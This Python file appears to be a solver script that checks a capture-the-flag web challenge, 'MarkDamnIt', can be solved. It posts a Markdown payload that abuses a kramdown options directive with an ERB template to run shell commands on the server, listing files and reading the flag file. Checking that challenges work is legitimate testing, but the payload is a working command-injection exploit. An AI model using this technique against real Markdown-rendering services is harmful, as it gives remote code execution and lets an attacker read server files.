import html
import re

import requests

from inspectors.web import WebChallengeInspector


class MarkDamnItInspector(WebChallengeInspector):
    def solve(self) -> bool:
        # step 1: find flag
        try:
            res = requests.post(f'{self.url}/', data={'md': self.__gen_payload('ls -la')})
            flag_file_name = re.search(r'flag-.+\.txt', res.text).group()
        except:
            self.logger.warning(self.msg_failed_to_solve())
            return False

        # step 2: cat the flag file
        try:
            res = requests.post(f'{self.url}/', data={'md': self.__gen_payload(f'cat {flag_file_name}')})
            assert html.escape(self.flag) in res.text

            self.logger.info(self.msg_succeeded_to_solve())
            return True
        except:
            self.logger.warning(self.msg_failed_to_solve())
            return False

    @staticmethod
    def __gen_payload(cmd: str):
        return f'{{::options template="string://<%=`{cmd}`%>" /}}'
